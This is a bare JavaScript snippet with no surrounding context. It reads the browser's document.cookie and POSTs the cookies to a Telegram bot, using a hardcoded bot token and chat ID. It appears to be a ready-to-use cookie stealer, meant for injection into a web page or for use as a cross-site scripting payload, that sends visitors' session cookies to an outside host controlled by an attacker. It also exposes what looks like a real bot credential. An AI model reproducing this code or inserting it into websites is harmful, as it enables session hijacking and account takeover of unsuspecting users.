const telegramToken = '6793665167:AAHlH0DyLyOi0To3qA1m53pEGY0TaI_AbKQ';
const chatId = '6845769806';

fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    chat_id: chatId,
    text: `Cookies: ${document.cookie}`
  })
});
